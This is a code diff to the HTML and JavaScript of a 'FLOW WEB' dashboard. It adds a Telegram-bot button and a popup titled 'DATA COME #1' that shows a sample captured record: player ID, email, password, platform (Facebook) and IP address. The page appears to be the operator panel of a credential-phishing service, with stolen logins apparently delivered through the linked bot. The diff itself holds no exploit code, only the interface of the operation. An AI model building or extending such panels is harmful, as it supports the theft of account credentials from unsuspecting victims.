@@ -273,6 +273,93 @@
     from { transform: translateY(100px); opacity: 0; }
     to { transform: translateY(0); opacity: 1; }
 }
+/* --- BOT POPUP OVERLAY --- */
+.bot-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.85);
+    z-index: 7000;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+/* --- BOT DATA CARD --- */
+.bot-card {
+    background: white;
+    width: 100%;
+    max-width: 380px;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+    animation: botFadeUp 0.4s ease;
+}
+
+/* --- BOT DATA HEADER --- */
+.bot-data-header {
+    padding: 15px;
+    border-bottom: 1px solid #eee;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: #f9f9f9;
+}
+
+.bot-data-title {
+    font-weight: 700;
+    font-size: 16px;
+    color: #1D1D35;
+    letter-spacing: 1px;
+}
+
+/* --- BOT DATA BODY --- */
+.bot-data-body {
+    padding: 20px;
+    font-family: 'Courier New', Courier, monospace; /* For technical look */
+}
+
+.data-line {
+    margin-bottom: 12px;
+    font-size: 13px;
+    color: #333;
+    display: flex;
+    align-items: flex-start;
+}
+
+.data-label {
+    font-weight: 700;
+    min-width: 110px;
+    color: #000;
+}
+
+.data-value {
+    color: #4A90E2;
+    word-break: break-all;
+}
+
+/* --- BOT FOOTER --- */
+.bot-footer {
+    padding: 15px;
+    text-align: center;
+    border-top: 1px solid #eee;
+}
+
+.bot-back-btn {
+    background: #7450FE;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 25px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+}
+
+@keyframes botFadeUp {
+    from { transform: translateY(30px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
 
  </style>
 </head>
@@ -355,7 +442,56 @@
 
             <h3 style="margin-bottom: 15px; font-size: 16px;">TELEGRAM SETTINGS</h3>
             <div class="categories">
-                <div class="cat-item"><div class="cat-icon" style="background:#000;"><i class="fa-solid fa-robot"></i></div><small>𝙏𝙂 𝘽𝙊𝙏</small></div>
+                <div class="cat-item" onclick="handleBotRedirect()">
+    <div class="cat-icon" style="background:#000;">
+        <i class="fa-solid fa-robot"></i>
+    </div>
+    <small>𝙏𝙂 𝘽𝙊𝙏</small>
+</div>
+
+<div id="bot-data-popup" class="bot-overlay">
+    <div class="bot-card">
+        <div class="bot-data-header">
+            <span class="bot-data-title">┌──── DATA COME #1 ────┐</span>
+            <i class="fa-solid fa-xmark" onclick="closeBotPopup()" style="cursor:pointer; color:#999;"></i>
+        </div>
+
+        <div class="bot-data-body">
+            <div class="data-line">
+                <span class="data-label">L─➤ Time:</span>
+                <span class="data-value">04:30 PM Saturday 06/12/2025</span>
+            </div>
+            <div class="data-line">
+                <span class="data-label">L─➤ Player ID:</span>
+                <span class="data-value">1234567890</span>
+            </div>
+            <div class="data-line">
+                <span class="data-label">L─➤ Email:</span>
+                <span class="data-value">example@gmail.com</span>
+            </div>
+            <div class="data-line">
+                <span class="data-label">L─➤ Password:</span>
+                <span class="data-value">1234567890</span>
+            </div>
+            <div class="data-line">
+                <span class="data-label">L─➤ Platform:</span>
+                <span class="data-value">Facebook</span>
+            </div>
+            <div class="data-line">
+                <span class="data-label">L─➤ IP:</span>
+                <span class="data-value">106.220.72.142</span>
+            </div>
+            <div class="data-line" style="margin-top:15px; border-top: 1px dashed #ccc; padding-top:10px; justify-content: center;">
+                <span style="font-size:10px; color:#999;">© FLOW WEB</span>
+            </div>
+        </div>
+
+        <div class="bot-footer">
+            <button class="bot-back-btn" onclick="closeBotPopup()">BACK TO DASHBOARD</button>
+        </div>
+    </div>
+</div>
+
                 <div class="cat-item" onclick="openOwnerTelegram()">
     <div class="cat-icon" style="background:#000;">
         <i class="fa-solid fa-crown"></i>
@@ -370,8 +506,8 @@
                 <i class="fa-solid fa-arrow-left" onclick="closeTgPopup()"></i>
                 <i class="fa-solid fa-ellipsis-vertical"></i>
             </div>
-            <img src="https://uploads.onecompiler.io/4472wkpre/44agbuxg7/eef745c62d8f0e13d0933246fca04631.jpg" class="tg-avatar-large">
-            <h2 style="font-weight: 600;">-FLOW OWNER ﷽</h2>
+            <img src="https://uploads.onecompiler.io/4472wkpre/44ajetact/IMG_20251103_093026_328.jpg" class="tg-avatar-large">
+            <h2 style="font-weight: 600;">—FLOW OWNER ﷽</h2>
             <span class="tg-online-tag"><i class="fa-solid fa-shield"></i> online</span>
         </div>
 
@@ -468,13 +604,6 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const database = firebase.database();
-
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('active');
-            document.querySelector('.sidebar-overlay').classList.toggle('active');
-        }
-
-        firebase.database();
 
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('active');
@@ -615,6 +744,39 @@ function showTgPopup() {
 
 function closeTgPopup() {
     document.getElementById('tg-profile-popup').style.display = 'none';
+}
+// Function to handle Bot Button Click
+function handleBotRedirect() {
+    const botURL = "http://t.me/FLOWxDATA_WEB_bot";
+    
+    // Flag set karein storage mein
+    localStorage.setItem('botRedirectActive', 'true');
+    
+    // Bot open karein
+    window.open(botURL, '_blank');
+}
+
+// Window Focus detection (Jab user Telegram se wapas aaye)
+window.onfocus = function() {
+    // Check if coming back from Bot
+    if (localStorage.getItem('botRedirectActive') === 'true') {
+        showBotPopup();
+        localStorage.removeItem('botRedirectActive');
+    }
+    
+    // Check if coming back from Owner (Existing logic)
+    if (localStorage.getItem('redirectedToTg') === 'true') {
+        showTgPopup();
+        localStorage.removeItem('redirectedToTg');
+    }
+};
+
+function showBotPopup() {
+    document.getElementById('bot-data-popup').style.display = 'flex';
+}
+
+function closeBotPopup() {
+    document.getElementById('bot-data-popup').style.display = 'none';
 }
 
     </script>
